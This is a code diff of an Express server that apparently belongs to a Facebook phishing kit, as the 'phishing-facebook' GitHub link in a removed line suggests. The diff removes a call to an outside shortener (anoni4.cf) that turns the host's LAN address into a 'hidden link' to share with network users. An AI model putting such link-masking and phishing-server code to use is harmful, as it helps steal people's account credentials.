@@ -5,9 +5,7 @@ const path = require('path');
 const fs = require('fs');
 const axios = require('axios');
 const os = require('os');
-var port = process.env.PORT || 1111;
-var networkInterfaces = os.networkInterfaces();
-
+const port = process.env.PORT || 1111;
 const app = express();
 
 app.engine('handlebars', exphbs({ defaultLayout: 'main' }));
@@ -52,8 +50,4 @@ app.get('/images/check.png', function (req, res) {
 
 app.listen(port, () => {
     console.log('[!] Server Running!')
-});
-
-axios.get(`http://anoni4.cf/api?create&key=D03hVPibJRaxvXqmus8NAE7WC6n2KyfGcwI&link=http://${networkInterfaces.Ethernet[0].address}:${port}`).then(async res => {
-    console.log(`[!] You can share this hidden link with your network users: ${res.data.Link}\n[!] If the link doesn't work. Try using your IPV4 + PORT: ${networkInterfaces.Ethernet[0].address}:${port}\n\n[+] Give this project a star on GitHub: https://github.com/pauloodev/phishing-facebook`)
 });
